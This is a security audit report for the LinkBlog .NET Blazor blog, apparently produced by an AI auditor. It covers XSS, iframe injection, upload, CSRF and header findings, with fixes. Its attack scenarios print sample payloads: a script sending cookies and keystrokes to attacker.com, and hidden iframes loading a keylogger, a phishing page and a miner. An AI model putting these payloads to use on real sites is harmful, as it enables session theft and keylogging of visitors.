# LinkBlog Security Audit Report

**Audit Date:** 2025-12-17
**Auditor:** Claude (Automated Security Audit)
**Application:** LinkBlog - .NET Blazor SSR Blog Platform
**Technology Stack:** .NET 10.0, Blazor SSR, PostgreSQL, Azure Blob Storage

---

## Executive Summary

This security audit identified **10 security issues** ranging from **CRITICAL** to **LOW** severity. The most significant findings include:

- **2 CRITICAL** vulnerabilities related to Cross-Site Scripting (XSS) and arbitrary HTML injection
- **4 MEDIUM** severity issues related to file upload security and CSRF protection
- **4 LOW/INFO** issues related to input validation and security headers

**Immediate action required** on CRITICAL issues to prevent potential compromise of user security.

---

## Critical Vulnerabilities (Immediate Action Required)

### 🔴 CRITICAL-1: Stored Cross-Site Scripting (XSS) via Unescaped HTML Rendering

**Severity:** CRITICAL
**Location:** `src/LinkBlog.Web/Components/Posts/BlogPost.razor:39`
**CVSS Score:** 8.8 (High)

**Issue:**
```csharp
<!-- Line 39 -->
@((MarkupString)DisplayPost.Contents!)
```

The application renders post contents as raw HTML without any sanitization. This creates a **Stored XSS** vulnerability where:

1. An admin creates a post with malicious JavaScript in the contents
2. The malicious script is stored in the database
3. Every visitor who views the post executes the malicious script

**Attack Scenario:**
```html
<!-- Admin could inject: -->
<script>
  // Steal cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);

  // Keylogging
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

**Impact:**
- Session hijacking
- Credential theft
- Defacement
- Malware distribution
- Phishing attacks

**Recommendation:**

**Option 1 (Recommended):** Implement HTML sanitization using `HtmlSanitizer` library:

```bash
dotnet add package HtmlSanitizer
```

```csharp
@inject IHtmlSanitizer HtmlSanitizer

<!-- Replace line 39 with: -->
@((MarkupString)HtmlSanitizer.Sanitize(DisplayPost.Contents!))
```

Configure the sanitizer in `Program.cs`:
```csharp
builder.Services.AddSingleton<IHtmlSanitizer>(sp =>
{
    var sanitizer = new HtmlSanitizer();

    // Allow safe tags
    sanitizer.AllowedTags.Clear();
    sanitizer.AllowedTags.Add("p");
    sanitizer.AllowedTags.Add("br");
    sanitizer.AllowedTags.Add("strong");
    sanitizer.AllowedTags.Add("em");
    sanitizer.AllowedTags.Add("a");
    sanitizer.AllowedTags.Add("img");
    sanitizer.AllowedTags.Add("ul");
    sanitizer.AllowedTags.Add("ol");
    sanitizer.AllowedTags.Add("li");
    sanitizer.AllowedTags.Add("blockquote");
    sanitizer.AllowedTags.Add("h1");
    sanitizer.AllowedTags.Add("h2");
    sanitizer.AllowedTags.Add("h3");

    // Allow safe attributes
    sanitizer.AllowedAttributes.Add("href");
    sanitizer.AllowedAttributes.Add("src");
    sanitizer.AllowedAttributes.Add("alt");
    sanitizer.AllowedAttributes.Add("title");

    // Enforce safe URL schemes
    sanitizer.AllowedSchemes.Clear();
    sanitizer.AllowedSchemes.Add("http");
    sanitizer.AllowedSchemes.Add("https");
    sanitizer.AllowedSchemes.Add("mailto");

    return sanitizer;
});
```

**Option 2:** Store content as Markdown instead of HTML and render with a Markdown library.

---

### 🔴 CRITICAL-2: Arbitrary HTML/iframe Injection via Trix Editor Extensions

**Severity:** CRITICAL
**Location:** `src/LinkBlog.Web/wwwroot/js/trix-extensions.js:8,55-58`
**CVSS Score:** 8.5 (High)

**Issue 1 - iframe Support Enabled:**
```javascript
// Line 8
Trix.config.dompurify.ADD_TAGS = ["iframe"];
```

**Issue 2 - Unsanitized HTML Injection:**
```javascript
// Lines 54-58
function promptForHTML(editor) {
    const html = prompt("Enter HTML code (e.g., iframe embed code):", "");
    if (html) {
        insertHTML(editor, html);
    }
}
```

The editor explicitly allows iframe tags and accepts arbitrary HTML from the admin without validation or sanitization.

**Attack Scenario:**
An admin (or compromised admin account) could inject:

```html
<!-- Keylogger iframe -->
<iframe src="https://attacker.com/keylogger.html" style="display:none"></iframe>

<!-- Clickjacking overlay -->
<iframe src="https://attacker.com/fake-login" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.5"></iframe>

<!-- Cryptocurrency miner -->
<iframe src="https://attacker.com/cryptominer.html" style="display:none"></iframe>
```

**Impact:**
- Embedded malicious iframes (keyloggers, coin miners, phishing)
- Clickjacking attacks
- Drive-by downloads
- Privacy violations (tracking pixels)
- Reputational damage

**Recommendation:**

**Option 1 (Recommended):** Remove iframe support entirely:

```javascript
// Remove or comment out line 8
// Trix.config.dompurify.ADD_TAGS = ["iframe"];

// Remove the HTML injection button functionality (lines 53-66)
```

**Option 2:** If iframe embedding is absolutely necessary:

1. Create a whitelist of allowed iframe sources (YouTube, Vimeo, etc.)
2. Implement server-side validation
3. Use iframe sandbox attributes: `<iframe sandbox="allow-scripts allow-same-origin">`
4. Implement Content Security Policy headers

---

## Medium Severity Issues

### 🟡 MEDIUM-1: Client-Side Only File Type Validation

**Severity:** MEDIUM
**Location:** `src/LinkBlog.Web/wwwroot/js/upload-attachments.js:8-14`
**CVSS Score:** 5.3 (Medium)

**Issue:**
```javascript
// Lines 8-14
document.addEventListener("trix-file-accept", function(event) {
    const acceptedTypes = ["image/jpeg", "image/png", "image/gif"];
    if (!acceptedTypes.includes(event.file.type)) {
      event.preventDefault();
      alert("Only image files are allowed!");
    }
});
```

File type validation is performed **only in JavaScript**, which can be easily bypassed by:
- Disabling JavaScript
- Intercepting and modifying the request with a proxy (Burp Suite, OWASP ZAP)
- Spoofing the MIME type

**Attack Scenario:**
1. Attacker intercepts the upload request
2. Changes `Content-Type` header to `image/png`
3. Uploads a malicious file (PHP shell, executable, HTML with scripts)

**Impact:**
- Upload of non-image files to Azure Blob Storage
- Potential storage exhaustion
- Serving malicious files to users
- Though mitigated by ImageMagick conversion, still a security gap

**Recommendation:**

Add server-side validation in `UploadImageController.cs`:

```csharp
[HttpPost("upload")]
[RequireAntiforgeryToken(required: false)]
public async Task<ActionResult> UploadAsync(IFormFile file, CancellationToken ct)
{
    if (file is null)
    {
        logger.NoFileUploaded();
        return BadRequest();
    }

    // ADD: Server-side MIME type validation
    var allowedTypes = new[] { "image/jpeg", "image/png", "image/gif" };
    if (!allowedTypes.Contains(file.ContentType))
    {
        return BadRequest("Invalid file type. Only JPEG, PNG, and GIF images are allowed.");
    }

    // ADD: Magic byte validation (more secure than MIME type)
    using var headerStream = file.OpenReadStream();
    var header = new byte[8];
    await headerStream.ReadAsync(header, 0, 8, ct);

    if (!IsValidImageHeader(header))
    {
        return BadRequest("File does not appear to be a valid image.");
    }

    // ... rest of existing code
}

private bool IsValidImageHeader(byte[] header)
{
    // PNG: 89 50 4E 47 0D 0A 1A 0A
    if (header.Length >= 8 && header[0] == 0x89 && header[1] == 0x50 && header[2] == 0x4E && header[3] == 0x47)
        return true;

    // JPEG: FF D8 FF
    if (header.Length >= 3 && header[0] == 0xFF && header[1] == 0xD8 && header[2] == 0xFF)
        return true;

    // GIF: 47 49 46 38
    if (header.Length >= 4 && header[0] == 0x47 && header[1] == 0x49 && header[2] == 0x46 && header[3] == 0x38)
        return true;

    return false;
}
```

---

### 🟡 MEDIUM-2: Missing File Size Limits on Upload Endpoint

**Severity:** MEDIUM
**Location:** `src/LinkBlog.Web/Controllers/UploadImageController.cs:28-85`
**CVSS Score:** 5.0 (Medium)

**Issue:**

The upload endpoint has no explicit file size restrictions. While ASP.NET Core has default limits, they may not be appropriate for this use case.

**Attack Scenario:**
1. Attacker uploads extremely large image files (100MB+)
2. ImageMagick processes consume excessive CPU/memory
3. Azure Blob Storage costs increase
4. Potential Denial of Service

**Impact:**
- Resource exhaustion
- Increased cloud storage costs
- Application slowdown or crashes
- Denial of Service

**Recommendation:**

1. Add request size limits in `Program.cs`:

```csharp
builder.Services.Configure<FormOptions>(options =>
{
    options.MultipartBodyLengthLimit = 10 * 1024 * 1024; // 10MB limit
});
```

2. Add attribute to controller:

```csharp
[HttpPost("upload")]
[RequireAntiforgeryToken(required: false)]
[RequestSizeLimit(10 * 1024 * 1024)] // 10MB
public async Task<ActionResult> UploadAsync(IFormFile file, CancellationToken ct)
{
    // ... existing code

    // ADD: Explicit size check
    if (file.Length > 10 * 1024 * 1024)
    {
        return BadRequest("File size exceeds 10MB limit.");
    }

    // ... rest of code
}
```

---

### 🟡 MEDIUM-3: Antiforgery Token Disabled on Upload Endpoint

**Severity:** MEDIUM
**Location:** `src/LinkBlog.Web/Controllers/UploadImageController.cs:27`
**CVSS Score:** 4.8 (Medium)

**Issue:**
```csharp
// Line 27
[RequireAntiforgeryToken(required: false)]
```

CSRF protection is explicitly disabled on the upload endpoint. While the endpoint requires authentication, a CSRF attack could still be possible.

**Attack Scenario:**
1. Attacker creates a malicious website
2. Authenticated admin visits the malicious site
3. Site submits a POST request to `/api/upload` using the admin's session
4. Unwanted images are uploaded to the blog

**Impact:**
- Unauthorized file uploads
- Storage exhaustion
- Potential upload of inappropriate content

**Recommendation:**

**Option 1:** Include antiforgery token in the JavaScript upload:

```javascript
// In upload-attachments.js
function uploadFile(attachment, progressCallback, successCallback) {
    var file = attachment.file
    var formData = createFormData(file)
    var xhr = new XMLHttpRequest()

    xhr.open("POST", "/api/upload", true)

    // ADD: Include antiforgery token
    var token = document.querySelector('input[name="__RequestVerificationToken"]').value;
    xhr.setRequestHeader("RequestVerificationToken", token);

    // ... rest of code
}
```

And remove the `required: false`:
```csharp
[HttpPost("upload")]
[RequireAntiforgeryToken] // Remove required: false
public async Task<ActionResult> UploadAsync(IFormFile file, CancellationToken ct)
```

**Option 2:** Use the `[ValidateAntiForgeryToken]` attribute with custom header handling.

---

### 🟡 MEDIUM-4: Hardcoded Single Admin User (Inflexible Authorization)

**Severity:** MEDIUM
**Location:** `src/LinkBlog.Web/Security/AdminIdentifiers.cs:5`, `src/LinkBlog.Web/Program.cs:40`
**CVSS Score:** 4.5 (Medium)

**Issue:**
```csharp
// AdminIdentifiers.cs
public const string DavidJarmanGitHubId = "1639399";

// Program.cs:40
policy.AddPolicy("Admin", policy => policy.RequireClaim(ClaimTypes.NameIdentifier, AdminIdentifiers.DavidJarmanGitHubId));
```

Authorization is hardcoded to a single GitHub user ID. This creates several problems:

**Issues:**
- Single point of failure (if GitHub account compromised)
- No multi-admin support
- No role management
- Requires code changes to add/remove admins
- No audit trail for admin actions

**Impact:**
- Limited operational flexibility
- Security risk if account is compromised
- Difficulty in team collaboration

**Recommendation:**

**Option 1:** Move admin list to configuration:

1. Create `appsettings.json` entry:
```json
{
  "Authorization": {
    "AdminGitHubIds": ["1639399", "other-id"]
  }
}
```

2. Update `Program.cs`:
```csharp
var adminIds = builder.Configuration.GetSection("Authorization:AdminGitHubIds").Get<string[]>()
    ?? throw new InvalidOperationException("Admin IDs not configured");

builder.Services.AddAuthorization(policy =>
{
    policy.AddPolicy("Admin", policy =>
        policy.RequireAssertion(context =>
            context.User.HasClaim(c =>
                c.Type == ClaimTypes.NameIdentifier &&
                adminIds.Contains(c.Value)
            )
        )
    );
});
```

**Option 2 (Better):** Create an `AdminUsers` database table:

```sql
CREATE TABLE AdminUsers (
    Id SERIAL PRIMARY KEY,
    GitHubId VARCHAR(100) NOT NULL UNIQUE,
    Username VARCHAR(200) NOT NULL,
    Email VARCHAR(200),
    CreatedAt TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    IsActive BOOLEAN NOT NULL DEFAULT TRUE
);
```

Then check authorization against the database.

---

## Low/Informational Issues

### 🔵 LOW-1: No Server-Side Validation Beyond Form Validation

**Severity:** LOW
**Location:** `src/LinkBlog.Web/Components/Pages/Admin/AdminHome.razor:142-163`

**Issue:**

Input validation relies on DataAnnotations in the form model. While this provides client and server validation, there's no additional validation at the service/repository layer.

**Recommendation:**

Add validation in `PostStore.cs` before database operations:

```csharp
public async Task CreatePostAsync(Post post, CancellationToken cancellationToken = default)
{
    // Validate inputs
    if (string.IsNullOrWhiteSpace(post.Title) || post.Title.Length > 200)
        throw new ArgumentException("Invalid title", nameof(post));

    if (string.IsNullOrWhiteSpace(post.ShortTitle) || post.ShortTitle.Length > 100)
        throw new ArgumentException("Invalid short title", nameof(post));

    if (!Regex.IsMatch(post.ShortTitle, @"^[a-z0-9\-]+$"))
        throw new ArgumentException("Short title contains invalid characters", nameof(post));

    // ... existing code
}
```

---

### 🔵 LOW-2: Search Query Has No Length Limit

**Severity:** LOW
**Location:** `src/LinkBlog.Web/Components/Pages/Search.razor`, `src/LinkBlog.Web/Services/PostStore.cs:119-128`

**Issue:**

The search query parameter has no length restriction, allowing extremely long queries.

**Attack Scenario:**
- Attacker sends search queries with 10,000+ characters
- PostgreSQL full-text search may consume excessive resources
- Potential for slowdown or resource exhaustion

**Recommendation:**

Add length validation in `PostStore.cs`:

```csharp
public async IAsyncEnumerable<Post> SearchPostsAsync(string searchQuery, int maxResults = 50, [EnumeratorCancellation] CancellationToken cancellationToken = default)
{
    if (string.IsNullOrWhiteSpace(searchQuery))
    {
        yield break;
    }

    // ADD: Length limit
    if (searchQuery.Length > 200)
    {
        searchQuery = searchQuery.Substring(0, 200);
    }

    // ... existing code
}
```

---

### 🔵 LOW-3: Missing Security Headers

**Severity:** LOW
**Location:** `src/LinkBlog.Web/Program.cs` (middleware configuration)

**Issue:**

The application is missing important security headers:
- `Content-Security-Policy` (CSP)
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

**Current State:**
- ✅ HSTS is enabled (production only)
- ✅ HTTPS redirection is enabled
- ❌ CSP is not configured
- ❌ X-Frame-Options is not configured

**Impact:**
- Increased XSS risk (no CSP)
- Clickjacking vulnerability (no X-Frame-Options)
- MIME-sniffing attacks (no X-Content-Type-Options)

**Recommendation:**

Add security headers middleware in `Program.cs`:

```csharp
// Add after app.UseHttpsRedirection();
app.Use(async (context, next) =>
{
    // Prevent clickjacking
    context.Response.Headers.Add("X-Frame-Options", "DENY");

    // Prevent MIME sniffing
    context.Response.Headers.Add("X-Content-Type-Options", "nosniff");

    // Referrer policy
    context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");

    // Content Security Policy
    // Note: You'll need to adjust this based on your actual needs, especially for Trix editor
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline'; " + // Trix may require unsafe-inline
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' https: data:; " +
        "font-src 'self'; " +
        "connect-src 'self'; " +
        "frame-ancestors 'none';");

    // Permissions policy
    context.Response.Headers.Add("Permissions-Policy",
        "geolocation=(), microphone=(), camera=()");

    await next();
});
```

**Note:** The CSP policy above may need adjustment based on Trix editor requirements and Azure Blob Storage URLs.

---

### 🔵 LOW-4: HSTS Only Enabled in Production

**Severity:** INFORMATIONAL
**Location:** `src/LinkBlog.Web/Program.cs:89-107`

**Issue:**
```csharp
if (!app.Environment.IsDevelopment())
{
    // ...
    app.UseHsts();
}
```

HSTS headers are only applied in production environments. While this is acceptable for development, it means security testing in development won't catch HSTS-related issues.

**Recommendation:**

Consider enabling HSTS in all environments for consistency:

```csharp
// Remove the environment check
app.UseHsts();

// Or configure differently per environment
if (app.Environment.IsDevelopment())
{
    app.UseHsts(options => options.MaxAge = TimeSpan.FromMinutes(5));
}
else
{
    app.UseHsts(options => options.MaxAge = TimeSpan.FromDays(365).IncludeSubDomains().Preload());
}
```

---

## Positive Security Findings ✅

The following security controls are properly implemented:

1. **✅ SQL Injection Protection**
   - Location: `src/LinkBlog.Web/Services/PostStore.cs:120-128`
   - EF Core uses parameterized queries (`{0}`, `{1}` placeholders)
   - No string concatenation in SQL queries

2. **✅ Authentication via OAuth 2.0**
   - Delegates authentication to GitHub
   - No password storage required
   - Secure token handling

3. **✅ Authorization Enforcement**
   - Admin endpoints properly protected with `[Authorize(Policy = "Admin")]`
   - Authorization checks on all sensitive operations

4. **✅ HTTPS Enforcement**
   - HTTPS redirection enabled
   - Secure cookies (implied by ASP.NET Core defaults)

5. **✅ Input Validation**
   - Form validation with DataAnnotations
   - Regex validation for ShortTitle and Tags
   - Type-safe routing with int constraints

6. **✅ Image Metadata Stripping**
   - Location: `src/LinkBlog.Images/ImageConverter.cs:26`
   - Removes EXIF data and sensitive metadata
   - Prevents information disclosure

7. **✅ Database Constraints**
   - Unique constraints on ShortTitle and Tag.Name
   - Prevents duplicate entries
   - Data integrity enforced

8. **✅ Antiforgery Tokens (Partial)**
   - Enabled globally via `app.UseAntiforgery()`
   - EditForm components use antiforgery by default

9. **✅ Forwarded Headers Handling**
   - Properly configured for reverse proxy scenarios
   - Heroku-specific configuration

10. **✅ Environment-Based Configuration**
    - Secrets in user secrets (development)
    - Environment variables (production)
    - No hardcoded credentials

---

## Risk Summary

| Severity | Count | Findings |
|----------|-------|----------|
| 🔴 **CRITICAL** | 2 | XSS via MarkupString, iframe injection |
| 🟡 **MEDIUM** | 4 | File validation, file size limits, CSRF on upload, hardcoded admin |
| 🔵 **LOW/INFO** | 4 | Service validation, search limits, security headers, HSTS |
| **TOTAL** | **10** | |

---

## Remediation Priority

### Phase 1: Immediate (Within 24 hours)
1. ✅ Implement HTML sanitization for post contents (CRITICAL-1)
2. ✅ Remove iframe support and HTML injection button (CRITICAL-2)

### Phase 2: High Priority (Within 1 week)
3. ✅ Add server-side file type validation (MEDIUM-1)
4. ✅ Implement file size limits (MEDIUM-2)
5. ✅ Fix antiforgery token on upload (MEDIUM-3)

### Phase 3: Medium Priority (Within 1 month)
6. ✅ Move admin users to configuration/database (MEDIUM-4)
7. ✅ Add security headers (LOW-3)

### Phase 4: Low Priority (Backlog)
8. ✅ Add service-layer validation (LOW-1)
9. ✅ Implement search query length limits (LOW-2)
10. ✅ Enable HSTS in development (LOW-4)

---

## Testing Recommendations

After implementing fixes, perform the following security tests:

1. **XSS Testing**
   - Attempt to inject `<script>alert('XSS')</script>` in post contents
   - Verify HTML sanitizer blocks malicious tags
   - Test with various XSS payloads (OWASP XSS Filter Evasion Cheat Sheet)

2. **File Upload Testing**
   - Try uploading non-image files
   - Try uploading files with spoofed MIME types
   - Try uploading extremely large files
   - Verify magic byte validation works

3. **CSRF Testing**
   - Create a cross-origin form that posts to `/api/upload`
   - Verify antiforgery token is required

4. **Authorization Testing**
   - Try accessing `/admin` without authentication
   - Try accessing `/admin` with non-admin GitHub account
   - Verify proper 401/403 responses

5. **Security Headers Testing**
   - Use https://securityheaders.com to scan the site
   - Verify all recommended headers are present
   - Check CSP is not blocking legitimate functionality

---

## Additional Recommendations

1. **Implement Rate Limiting**
   - Add rate limiting to prevent brute force and DoS attacks
   - Consider using `AspNetCoreRateLimit` NuGet package

2. **Add Logging and Monitoring**
   - Log all admin actions (create, edit, delete, upload)
   - Monitor for suspicious activity
   - Set up alerts for repeated failed auth attempts

3. **Regular Dependency Updates**
   - Keep all NuGet packages updated
   - Monitor for security advisories
   - Consider using `dotnet list package --vulnerable`

4. **Security Scanning**
   - Integrate SAST (Static Application Security Testing) tools
   - Run regular dependency vulnerability scans
   - Consider GitHub Dependabot or Snyk

5. **Penetration Testing**
   - Conduct regular penetration tests
   - Consider bug bounty program for production

---

## Compliance Notes

Depending on your jurisdiction and use case, you may need to consider:

- **GDPR** - If collecting user data from EU citizens
- **CCPA** - If collecting data from California residents
- **Accessibility** - WCAG 2.1 compliance
- **Cookie Consent** - If using analytics or tracking cookies

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [ASP.NET Core Security Best Practices](https://docs.microsoft.com/en-us/aspnet/core/security/)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)

---

## Conclusion

The LinkBlog application has a solid security foundation with proper authentication, authorization, and SQL injection protection. However, the **two critical XSS vulnerabilities** pose significant risk and should be addressed immediately.

After implementing the recommended fixes, the application will have significantly improved security posture. Regular security reviews and updates should be part of the ongoing maintenance process.

**Next Steps:**
1. Prioritize and implement Critical fixes (CRITICAL-1, CRITICAL-2)
2. Review and approve Medium priority fixes
3. Schedule Low priority improvements
4. Set up automated security scanning
5. Document security processes and procedures

---

**Report Generated:** 2025-12-17
**Contact:** For questions about this report, please file an issue in the repository.
